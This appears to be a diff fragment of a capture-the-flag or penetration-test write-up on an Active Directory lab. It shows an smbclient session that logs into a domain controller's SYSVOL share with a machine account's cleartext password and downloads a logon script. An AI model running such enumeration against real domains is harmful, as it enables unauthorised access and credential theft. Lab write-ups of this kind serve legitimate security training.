@@ -223,4 +223,37 @@ LDAP        10.0.16.121     389    EC2AMAZ-A5O4OL8  Compressing output into /hom
 
 Ive collected the loot!
 
-There is no int
+There is no interesting permissions on bloodhound
+
+# `SYSVOL` share
+
+```python
+smbclient //EC2AMAZ-A5O4OL8.past.local/SYSVOL -U 'APPDEV01$'%'P@ssw0rd!'
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Jan 23 21:32:56 2026
+  ..                                  D        0  Fri Jan 23 21:32:56 2026
+  past.local                         Dr        0  Fri Jan 23 21:32:56 2026
+
+		7863807 blocks of size 4096. 2591591 blocks available
+smb: \> cd past.local\
+smb: \past.local\> ls
+  .                                   D        0  Fri Jan 23 21:40:44 2026
+  ..                                  D        0  Fri Jan 23 21:40:44 2026
+  DfsrPrivate                      DHSr        0  Fri Jan 23 21:40:44 2026
+  Policies                            D        0  Fri Jan 23 21:33:14 2026
+  scripts                             D        0  Sat Jan 24 01:55:55 2026
+
+		7863807 blocks of size 4096. 2591587 blocks available
+smb: \past.local\> cd scripts\
+smb: \past.local\scripts\> ls
+  .                                   D        0  Sat Jan 24 01:55:55 2026
+  ..                                  D        0  Sat Jan 24 01:55:55 2026
+  tyler_init.cmd                      A      238  Sat Jan 24 01:55:55 2026
+
+		7863807 blocks of size 4096. 2591587 blocks available
+smb: \past.local\scripts\> get tyler_init.cmd 
+getting file \past.local\scripts\tyler_init.cmd of size 238 as tyler_init.cmd (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+smb: \past.local\scripts\>
+```
+
